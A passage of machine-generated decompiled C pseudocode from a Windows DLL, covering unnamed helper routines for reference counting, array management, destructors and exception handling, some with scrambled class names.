  result = (*((int (__thiscall **)(void **, _DWORD, _DWORD, int))v2 + 21))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (1001180A) --------------------------------------------------------
BOOL __thiscall sub_1001180A(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (10011815) --------------------------------------------------------
int __thiscall sub_10011815(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(_DWORD *)(this[3] + 4 * i) = 0;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}

//----- (10011857) --------------------------------------------------------
unsigned int __thiscall sub_10011857(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1008EA62);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 4 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (100118C9) --------------------------------------------------------
unsigned int __thiscall sub_100118C9(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (100118F1) --------------------------------------------------------
unsigned int __stdcall sub_100118F1(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (10011904) --------------------------------------------------------
unsigned int __thiscall sub_10011904(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(4 * v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      *(_DWORD *)(this[3] + 4 * v6) = *(_DWORD *)(a3 + 4 * v6);
      ++v6;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}

//----- (10011962) --------------------------------------------------------
void __thiscall sub_10011962(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  void *v6; // ebx
  _DWORD *v7; // edi
  int v8; // ebx
  void *Block; // [esp+8h] [ebp-10h]
  _DWORD *v10; // [esp+Ch] [ebp-Ch]
  int v11; // [esp+10h] [ebp-8h]
  unsigned int v12; // [esp+14h] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v11 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v11 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (void *)this[3];
    Block = v6;
    v12 = 0;
    v7 = operator new(4 * v11);
    v10 = v7;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v8 = (_BYTE *)v6 - (_BYTE *)v7;
      do
      {
        ++v12;
        *v7 = *(_DWORD *)((char *)v7 + v8);
        ++v7;
      }
      while ( v12 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    }
    this[3] = v10;
    j__free(Block);
    this[2] = v11;
  }
}

//----- (10011A18) --------------------------------------------------------
int __userpurge sub_10011A18@<eax>(__int32 a1@<eax>, int a2)
{
  sub_10011D12(a1);
  return a2;
}

//----- (10011A2D) --------------------------------------------------------
void __thiscall sub_10011A2D(void *this)
{
  sub_10011D89((int)this);
}

//----- (10011A72) --------------------------------------------------------
_DWORD *__userpurge sub_10011A72@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10011AB1) --------------------------------------------------------
void __thiscall sub_10011AB1(void *this)
{
  sub_10011DC3((int)this);
}

//----- (10011AF6) --------------------------------------------------------
_DWORD *__userpurge sub_10011AF6@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10011B35) --------------------------------------------------------
void __thiscall sub_10011B35(void *this)
{
  sub_10011DFD((int)this);
}

//----- (10011B7A) --------------------------------------------------------
_DWORD *__userpurge sub_10011B7A@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10011BB9) --------------------------------------------------------
void __thiscall sub_10011BB9(void *this)
{
  sub_10011E37((int)this);
}

//----- (10011BFE) --------------------------------------------------------
_DWORD *__userpurge sub_10011BFE@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10011C3D) --------------------------------------------------------
void __thiscall sub_10011C3D(void *this)
{
  sub_10011E71((int)this);
}

//----- (10011C6E) --------------------------------------------------------
void *__thiscall sub_10011C6E(void *Block, char a2)
{
  sub_10011668((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10011C8D) --------------------------------------------------------
_DWORD *__stdcall sub_10011C8D(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10072944;
  *a1 = &off_100737F8;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 100737F8: using guessed type int (__thiscall *off_100737F8)(void *Block, char);

//----- (10011CCA) --------------------------------------------------------
void __usercall sub_10011CCA(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10011CF2) --------------------------------------------------------
void *__usercall sub_10011CF2@<eax>(int a1@<eax>, _DWORD *a2@<esi>)
{
  void *result; // eax

  a2[1] = 0;
  a2[2] = a1;
  result = operator new(4 * a1);
  a2[3] = result;
  return result;
}

//----- (10011D12) --------------------------------------------------------
int __usercall sub_10011D12@<eax>(__int32 a1@<eax>)
{
  int v1; // ecx
  int result; // eax
  void *v3; // eax
  int v4; // ecx
  _DWORD v5[2]; // [esp+10h] [ebp-18h] BYREF
  void *Block[3]; // [esp+18h] [ebp-10h] BYREF
  int v7; // [esp+24h] [ebp-4h]

  v1 = dword_10091DBC;
  result = _InterlockedExchange((volatile __int32 *)Block, a1);
  if ( !v1 )
  {
    sub_10012C8B(dword_100957FC, v5);
    v7 = 0;
    if ( !dword_10091DBC )
    {
      v3 = operator new(0x34u);
      Block[0] = v3;
      LOBYTE(v7) = 1;
      if ( v3 )
      {
        v3 = (void *)sub_1000FD19((int)v3);
        v4 = (int)v3;
      }
      else
      {
        v4 = 0;
      }
      LOBYTE(v7) = 0;
      _InterlockedExchange((volatile __int32 *)Block, (__int32)v3);
      dword_10091DBC = v4;
      dword_1009242C = v4;
    }
    v7 = -1;
    return sub_10012CBF(v5);
  }
  return result;
}
// 10091DBC: using guessed type int dword_10091DBC;
// 1009242C: using guessed type int dword_1009242C;
// 100957FC: using guessed type int dword_100957FC[9];
// 10011D12: using guessed type _DWORD var_18[2];

//----- (10011D89) --------------------------------------------------------
void __usercall sub_10011D89(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10011DC3) --------------------------------------------------------
void __usercall sub_10011DC3(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10011DFD) --------------------------------------------------------
void __usercall sub_10011DFD(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10011E37) --------------------------------------------------------
void __usercall sub_10011E37(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10011E71) --------------------------------------------------------
void __usercall sub_10011E71(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10011EED) --------------------------------------------------------
int __usercall sub_10011EED@<eax>(int a1@<esi>)
{
  *(_DWORD *)a1 = off_100738F4;
  *(_BYTE *)(a1 + 4) = 0;
  *(_DWORD *)(a1 + 8) = _set_se_translator((void (__cdecl *)(unsigned int, struct _EXCEPTION_POINTERS *))sub_10011F70);
  *(_BYTE *)(a1 + 4) = 1;
  return a1;
}
// 100738F4: using guessed type int (__thiscall *off_100738F4[2])(void *Block, char);

//----- (10011F0C) --------------------------------------------------------
_DWORD *__thiscall sub_10011F0C(_DWORD *Block, char a2)
{
  sub_10011F2B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10011F2B) --------------------------------------------------------
void (__cdecl *__thiscall sub_10011F2B(_DWORD *this))(unsigned int, struct _EXCEPTION_POINTERS *)
{
  *this = off_100738F4;
  return sub_10011F5C((int)this);
}
// 100738F4: using guessed type int (__thiscall *off_100738F4[2])(void *Block, char);

//----- (10011F5C) --------------------------------------------------------
void (__cdecl *__usercall sub_10011F5C@<eax>(int a1@<esi>))(unsigned int, struct _EXCEPTION_POINTERS *)
{
  void (__cdecl *result)(unsigned int, struct _EXCEPTION_POINTERS *); // eax

  if ( *(_BYTE *)(a1 + 4) )
  {
    result = _set_se_translator(*(void (__cdecl **)(unsigned int, struct _EXCEPTION_POINTERS *))(a1 + 8));
    *(_BYTE *)(a1 + 4) = 0;
  }
  return result;
}

//----- (10011F70) --------------------------------------------------------
void __cdecl __noreturn sub_10011F70(unsigned int a1, struct _EXCEPTION_POINTERS *a2)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_1000E0E3(pExceptionObject, a2->ExceptionRecord->ExceptionCode);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVHfpmmmiamaHpnxxaqhf_sr__);
}
// 10011F70: using guessed type _DWORD pExceptionObject[2];

//----- (10011F94) --------------------------------------------------------
_DWORD *__thiscall sub_10011F94(_DWORD *this, int a2)
{
  sub_1000DEB4(this, a2);
  *this = &off_10073470;
  this[1] = *(_DWORD *)(a2 + 4);
  return this;
}
// 10073470: using guessed type int (__thiscall *off_10073470)(void *Block, char);

//----- (10011FCC) --------------------------------------------------------
BOOL __stdcall sub_10011FCC(int a1)
{
  return !sub_10014E39(a1);
}

//----- (10011FE0) --------------------------------------------------------
_DWORD *__stdcall sub_10011FE0(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_100738F8;
  return a1;
}
// 100738F8: using guessed type int (__thiscall *off_100738F8)(void *Block, char);

//----- (1001200E) --------------------------------------------------------
_DWORD *__thiscall sub_1001200E(_DWORD *Block, char a2)
{
  sub_1001202D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001202D) --------------------------------------------------------
void __thiscall sub_1001202D(_DWORD *this)
{
  *this = &off_100738F8;
  sub_1000DF1A(this);
}
// 100738F8: using guessed type int (__thiscall *off_100738F8)(void *Block, char);

//----- (10012051) --------------------------------------------------------
int __stdcall sub_10012051(int a1, int a2, _DWORD *a3, _DWORD *Block)
{
  int *v4; // eax
  int v6[2]; // [esp+38h] [ebp-38h] BYREF
  int v7; // [esp+4Ch] [ebp-24h] BYREF
  int v8; // [esp+50h] [ebp-20h] BYREF
  int v9; // [esp+6Ch] [ebp-4h]

  *(_DWORD *)a1 = off_10073900;
  sub_10009F32((_DWORD *)(a1 + 4), (int)&unk_10095410);
  v9 = 0;
  sub_10009F32((_DWORD *)(a1 + 12), (int)&unk_10095408);
  sub_10009F32((_DWORD *)(a1 + 20), (int)&unk_10095434);
  sub_1000F04B((int *)(a1 + 28), a2);
  *(_DWORD *)(a1 + 40) = -1;
  sub_10009F32((_DWORD *)(a1 + 44), (int)&unk_1009542C);
  sub_1000F2B5((_DWORD *)(a1 + 52), 0, 0);
  sub_100128D9((_DWORD *)(a1 + 64));
  sub_1000C3F3(a3, a1 + 72);
  *(_BYTE *)(a1 + 92) = 0;
  sub_10012957((_DWORD *)(a1 + 93));
  *(_DWORD *)(a1 + 101) = 0;
  sub_10003148((_DWORD *)(a1 + 105), 0);
  sub_10003148((_DWORD *)(a1 + 114), 0);
  LOBYTE(v9) = 11;
  sub_10012737(Block, &v7);
  LOBYTE(v9) = 12;
  sub_100128B4((_DWORD *)(a1 + 105), &v8);
  if ( !*(_DWORD *)(a1 + 84) )
  {
    v4 = (int *)sub_1000C28D((void *)(*(_DWORD *)(v8 + 12) + 8), (int)v6, Block);
    LOBYTE(v9) = 13;
    sub_1000C439(v4, a1 + 72);
    LOBYTE(v9) = 12;
    sub_1000C45D(v6);
  }
  LOBYTE(v9) = 11;
  sub_100122B8((int)&v7);
  return a1;
}
// 10073900: using guessed type int (__thiscall *off_10073900[2])(void *Block, char);

//----- (10012299) --------------------------------------------------------
void *__thiscall sub_10012299(void *Block, char a2)
{
  sub_100122DB((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100122B8) --------------------------------------------------------
void __stdcall sub_100122B8(int a1)
{
  sub_1000318C((void *)(a1 + 4));
}

//----- (100122DB) --------------------------------------------------------
void __thiscall sub_100122DB(int this)
{
  *(_DWORD *)this = off_10073900;
  if ( *(_BYTE *)(this + 92) == 1 )
    sub_100123A7((_DWORD *)this);
  sub_1000318C((void *)(this + 114));
  sub_1000318C((void *)(this + 105));
  sub_10012992((void *)(this + 93));
  sub_1000C45D((int *)(this + 72));
  sub_10012914((void *)(this + 64));
  sub_1000F307((int *)(this + 52));
  sub_10009F65((int *)(this + 44));
  sub_1000F027((int *)(this + 28));
  sub_10009F65((int *)(this + 20));
  sub_10009F65((int *)(this + 12));
  sub_10009F65((int *)(this + 4));
}
// 10073900: using guessed type int (__thiscall *off_10073900[2])(void *Block, char);

//----- (100123A7) --------------------------------------------------------
void __stdcall sub_100123A7(_DWORD *a1)
{
  int v1; // eax

  v1 = a1[16];
  if ( v1 && *(_BYTE *)(v1 + 40) )
  {
    if ( sub_10011FCC(*(_DWORD *)((char *)a1 + 93)) )
    {
      (*(void (__thiscall **)(_DWORD *))(a1[7] + 16))(a1 + 7);
      sub_10014CC5((int)(a1 + 13), 30000, 0);
      sub_10013D41(a1[16]);
    }
  }
}

//----- (1001241E) --------------------------------------------------------
_DWORD *__stdcall sub_1001241E(int a1, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  int v5; // eax
  int *v6; // ebx
  _DWORD *v7; // eax
  int v8; // eax
  int v9; // ebx
  int v10; // esi
  int v11; // ebx
  char v12; // [esp-2Ch] [ebp-94h] BYREF
  int v13; // [esp-28h] [ebp-90h]
  int v14; // [esp-24h] [ebp-8Ch]
  int v15; // [esp-20h] [ebp-88h]
  int v16; // [esp-1Ch] [ebp-84h]
  int v17; // [esp-18h] [ebp-80h]
  int v18; // [esp-14h] [ebp-7Ch]
  int v19; // [esp-10h] [ebp-78h]
  int v20; // [esp-Ch] [ebp-74h]
  int v21; // [esp-8h] [ebp-70h]
  int v22; // [esp-4h] [ebp-6Ch]
  int v23[11]; // [esp+10h] [ebp-58h] BYREF
  int v24[3]; // [esp+3Ch] [ebp-2Ch] BYREF
  int pExceptionObject; // [esp+48h] [ebp-20h] BYREF
  int v26; // [esp+4Ch] [ebp-1Ch] BYREF
  void *Block; // [esp+50h] [ebp-18h]
  int v28; // [esp+54h] [ebp-14h]
  int v29; // [esp+64h] [ebp-4h]

  v28 = 0;
  if ( sub_10014E39(a1 + 28) || sub_1000F084(a1 + 20) )
    goto LABEL_2;
  if ( *(_DWORD *)(*(_DWORD *)(a1 + 56) + 16) )
  {
    Block = (void *)(*(int (__thiscall **)(int))(*(_DWORD *)(a1 + 52) + 16))(a1 + 52);
    if ( Block == (void *)259 )
    {
LABEL_2:
      sub_1000F2B5(a2, 0, 0);
      v29 = 0;
      v28 = 1;
      return a2;
    }
    if ( sub_10011FCC(*(_DWORD *)(a1 + 93)) )
      sub_10013D41(*(_DWORD *)(a1 + 64));
    if ( Block == (void *)888 )
    {
      sub_10011FE0(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVVkleVkdoghmczMqygvklev_vwfp_qlp_pqesih_sr__);
    }
  }
  v29 = 2;
  v3 = operator new(0xCu);
  Block = v3;
  if ( v3 )
    v4 = sub_1001EBE1(v3, a1 + 4);
  else
    v4 = 0;
  sub_100129BD((int)v4, (_DWORD *)(a1 + 93));
  Sleep(0x4E20u);
  Block = operator new(0x2Cu);
  v29 = 6;
  if ( Block )
    v5 = sub_1001357D(*(_DWORD **)(a1 + 105), *(_DWORD *)(a1 + 93), (int)Block);
  else
    v5 = 0;
  LOBYTE(v29) = 0;
  v6 = (int *)(a1 + 64);
  sub_10012A18((_DWORD *)(a1 + 64), v5);
  v7 = sub_10009D2C(&v26, &word_1008F530);
  v29 = 7;
  sub_1001371F(*(_DWORD *)(a1 + 64), (int)v7, *(_DWORD *)(a1 + 101));
  LOBYTE(v29) = 0;
  sub_10009F65(&v26);
  v8 = *(_DWORD *)(a1 + 84);
  if ( v8 )
  {
    (*(void (__thiscall **)(_DWORD, int *, int, int, int))(**(_DWORD **)(a1 + 93) + 44))(
      *(_DWORD *)(a1 + 93),
      v23,
      v8,
      64,
      4096);
    v29 = 8;
    sub_1002A148(v23, (_DWORD *)(a1 + 72));
    Block = &v12;
    sub_10029EF7(&v12, v23);
    LOBYTE(v29) = 9;
    v9 = *v6;
    LOBYTE(v29) = 8;
    sub_10013EAC(v9, (int)v24, a1 + 44, v12, v13, v14, v15, v16, v17, v18, v19, v20, v21, v22);
    LOBYTE(v29) = 10;
    v10 = a1 + 52;
    sub_100126AF();
    LOBYTE(v29) = 8;
    sub_1000F307(v24);
    LOBYTE(v29) = 0;
    sub_10029DE8((int)v23);
  }
  else
  {
    Block = &v12;
    sub_10029D8C((int)&v12);
    v29 = 11;
    v11 = *v6;
    LOBYTE(v29) = 0;
    sub_10013EAC(v11, (int)v24, a1 + 44, v12, v13, v14, v15, v16, v17, v18, v19, v20, v21, v22);
    v29 = 12;
    v10 = a1 + 52;
    sub_100126AF();
    LOBYTE(v29) = 0;
    sub_1000F307(v24);
  }
  sub_1000F58B(v10, a2);
  v29 = 0;
  v28 = 1;
  return a2;
}
// 100126AF: using guessed type int sub_100126AF(void);
// 10029EF7: using guessed type _DWORD __stdcall sub_10029EF7(_DWORD, _DWORD);

//----- (100126D5) --------------------------------------------------------
int __cdecl sub_100126D5(int a1)
{
  int v2[6]; // [esp+10h] [ebp-1Ch] BYREF
  int v3; // [esp+28h] [ebp-4h]

  sub_1000EF5A(dword_10095460, v2, 1, 0);
  v3 = 1;
  sub_100031FA(a1);
  v3 = -1;
  sub_1000F027(v2);
  return 555;
}
// 10095460: using guessed type _DWORD dword_10095460[2];

//----- (10012737) --------------------------------------------------------
_DWORD *__thiscall sub_10012737(_DWORD *this, _DWORD *a2)
{
  int *v3; // eax
  int v4; // eax
  void **v5; // edi
  void *v6; // ebx
  void *v7; // edi
  void *v8; // eax
  int v9; // eax
  int v11; // [esp+18h] [ebp-1Ch] BYREF
  int v12; // [esp+1Ch] [ebp-18h]
  _DWORD pExceptionObject[4]; // [esp+20h] [ebp-14h] BYREF
  int v14; // [esp+30h] [ebp-4h]

  v12 = 0;
  v14 = 1;
  if ( !this )
  {
    sub_1000E201(pExceptionObject);
    v3 = pExceptionObject;
    goto LABEL_3;
  }
  sub_100127F0((int)a2);
  v12 = 1;
  v4 = *this;
  *a2 = *this;
  v5 = (void **)(this + 1);
  if ( !v4 )
  {
    sub_1000E201(&v11);
    v3 = &v11;
LABEL_3:
    _CxxThrowException(v3, (_ThrowInfo *)&_TI2_AVKugkdNnUifqbYgkugkdnn_sr__);
  }
  v6 = *v5;
  v7 = v5 + 1;
  v8 = operator new(0x14u);
  LOBYTE(v14) = 2;
  if ( v8 )
    v9 = sub_1000C28D(v6, (int)v8, v7);
  else
    v9 = 0;
  sub_100128A2(v9, a2 + 1);
  return a2;
}
// 10012737: using guessed type _DWORD pExceptionObject[4];

//----- (100127F0) --------------------------------------------------------
int __stdcall sub_100127F0(int a1)
{
  sub_10003148((_DWORD *)(a1 + 4), 0);
  return a1;
}

//----- (10012817) --------------------------------------------------------
_DWORD *__stdcall sub_10012817(_DWORD *a1, _DWORD *a2)
{
  volatile LONG *v2; // ecx

  *a1 = *a2;
  v2 = (volatile LONG *)a2[2];
  a1[2] = v2;
  a1[1] = a2[1];
  InterlockedIncrement(v2);
  return a1;
}

//----- (100128A2) --------------------------------------------------------
_DWORD *__userpurge sub_100128A2@<eax>(int a1@<edi>, _DWORD *a2)
{
  sub_100129D5(a2, a1);
  return a2;
}

//----- (100128B4) --------------------------------------------------------
_DWORD *__usercall sub_100128B4@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_100031CB((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (100128D9) --------------------------------------------------------
_DWORD *__usercall sub_100128D9@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}

//----- (10012914) --------------------------------------------------------
void __thiscall sub_10012914(void *this)
{
  sub_10012A5B((int)this);
}

//----- (10012957) --------------------------------------------------------
_DWORD *__usercall sub_10012957@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}

//----- (10012992) --------------------------------------------------------
void __thiscall sub_10012992(void *this)
{
  sub_10012AC6((int)this);
}

//----- (100129BD) --------------------------------------------------------
_DWORD *__userpurge sub_100129BD@<eax>(int a1@<edi>, _DWORD *a2)
{
  sub_10012A83(a2, a1);
  return a2;
}

//----- (100129D5) --------------------------------------------------------
void __usercall sub_100129D5(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_100031CB((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}

//----- (10012A18) --------------------------------------------------------
void __usercall sub_10012A18(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10012A5B((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}

//----- (10012A5B) --------------------------------------------------------
void __usercall sub_10012A5B(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10012A83) --------------------------------------------------------
void __usercall sub_10012A83(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10012AC6((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}

//----- (10012AC6) --------------------------------------------------------
void __usercall sub_10012AC6(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10012AFE) --------------------------------------------------------
_DWORD *__thiscall sub_10012AFE(_DWORD *Block, char a2)
{
  *Block = &off_10073904;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10073904: using guessed type int (__thiscall *off_10073904)(void *Block, char);

//----- (10012B30) --------------------------------------------------------
int __usercall sub_10012B30@<eax>(int a1@<esi>)
{
  _BYTE *v1; // eax

  v1 = sub_1002A534();
  if ( !*(_BYTE *)(a1 + 8) && v1 && v1[96] )
    *(_BYTE *)(a1 + 9) = 1;
  --*(_DWORD *)(a1 + 4);
  return (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 12))(a1);
}

//----- (10012B54) --------------------------------------------------------
int __usercall sub_10012B54@<eax>(int *a1@<esi>)
{
  int v1; // eax
  int result; // eax
  _BYTE *v3; // eax
  int v4; // [esp+0h] [ebp-8h] BYREF
  int pExceptionObject; // [esp+4h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int *))(*a1 + 4))(a1) )
  {
    sub_1002C535(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__);
  }
  (*(void (__thiscall **)(int *))(*a1 + 8))(a1);
  v1 = *a1;
  ++a1[1];
  result = (*(int (__thiscall **)(int *))(v1 + 4))(a1);
  if ( (_BYTE)result )
  {
    (*(void (__thiscall **)(int *))(*a1 + 12))(a1);
    sub_1002C535(&v4);
    _CxxThrowException(&v4, (_ThrowInfo *)&_TI2_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__);
  }
  if ( a1[1] == 1 )
  {
    v3 = sub_1002A534();
    result = v3 && v3[96];
    *((_BYTE *)a1 + 8) = result;
  }
  return result;
}

//----- (10012C1C) --------------------------------------------------------
char __thiscall sub_10012C1C(_BYTE *this)
{
  return this[9];
}

//----- (10012C3A) --------------------------------------------------------
_DWORD *__thiscall sub_10012C3A(_DWORD *Block, char a2)
{
  sub_10012C59(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10012C59) --------------------------------------------------------
int __thiscall sub_10012C59(_DWORD *this)
{
  *this = off_10073914;
  return sub_10012B30(this[1]);
}
// 10073914: using guessed type int (__thiscall *off_10073914[3])(void *Block, char);

//----- (10012C8B) --------------------------------------------------------
_DWORD *__usercall sub_10012C8B@<eax>(int *a1@<eax>, _DWORD *a2@<edi>)
{
  *a2 = off_10073918;
  a2[1] = a1;
  sub_10012B54(a1);
  return a2;
}
// 10073918: using guessed type int (__thiscall *off_10073918[2])(void *Block, char);

//----- (10012CA0) --------------------------------------------------------
_DWORD *__thiscall sub_10012CA0(_DWORD *Block, char a2)
{
  sub_10012CBF(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10012CBF) --------------------------------------------------------
int __thiscall sub_10012CBF(_DWORD *this)
{
  *this = off_10073918;
